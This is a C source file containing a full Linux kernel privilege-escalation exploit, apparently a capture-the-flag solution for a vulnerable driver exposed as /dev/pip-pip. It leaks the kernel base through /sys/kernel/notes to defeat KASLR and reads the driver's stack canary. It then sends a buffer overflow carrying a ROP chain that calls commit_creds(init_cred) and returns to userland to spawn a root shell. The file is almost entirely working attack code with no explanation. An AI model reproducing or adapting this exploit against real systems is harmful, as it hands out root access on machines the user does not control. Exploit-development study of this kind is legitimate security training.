#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>

uint64_t kbase;

unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(char *msg){
    perror(msg);
    exit(1);
}

void get_xen_leak(){
    puts("[+] leaking startup_xen offset from /sys/kernel/notes");    
    char garbage[0x100];
    uint64_t startup_xen;

    int xen_fd = open("/sys/kernel/notes", O_RDONLY);
    if (xen_fd == -1)
        fatal("open(xen)");

    read(xen_fd, garbage, 0xcc);
    read(xen_fd, &startup_xen, 0x8);

    kbase = startup_xen - 0x2268af0;

    printf("[+] startup_xen @ 0x%lx\n", startup_xen);
    printf("[+] kernel_base @ 0x%lx\n", kbase);

}

void spray(char *buffer, int size){
    for (int i = 0; i < size; i += 8)
        *(uint64_t *)&buffer[i] = 0x13371337c0de0000 + i;
}


int main(){
    puts("Lets ROll!!!!!!!");

    save_state();
    
    // Breaking Kaslr 
    get_xen_leak();

    // gads
    uint64_t init_cred = kbase + 0x1A575A0;
    uint64_t commit_creds = kbase + 0xD5870;
    uint64_t pop_rdi = kbase + 0xe0c36d; 
    uint64_t swapgs_iretq = kbase + 0x10017bd;

    printf("[*] init_cred @ 0x%lx\n", init_cred);
    printf("[*] commit_creds @ 0x%lx\n", commit_creds);
    printf("[*] swapgs @ 0x%lx\n", swapgs_iretq);

    // exploit
    int fd = open("/dev/pip-pip", O_RDWR);
    if (fd == -1) {
        fatal("pip-pip (open)");
    }

    char *buffer;
    if ((buffer = mmap((void*)0x1337000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == MAP_FAILED){
        fatal("pip-pip mmap");
    }

    // leaking canary
    read(fd, buffer, 0x8);
    uint64_t canary = *(long *)buffer;

    printf("[+] canary = 0x%lx\n", canary);

    // BOF + ROP
    char * body = buffer;
    char * email = buffer + 0x100;
    uint64_t* chain = (uint64_t *)&buffer[0x110];

    memset(body, 'a', 0x100);
    memcpy(email, "pip@fakemail.com", 0x10);

    *chain++ = canary;
    *chain++ = pop_rdi; 
    *chain++ = init_cred; 
    *chain++ = commit_creds; 
    *chain++ = swapgs_iretq;
    *chain++ = 0;                 // pad 
    *chain++ = 0;                 // pad 
    *chain++ = (unsigned long)&win;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    write(fd, buffer, 0x200);
    return 0;
}
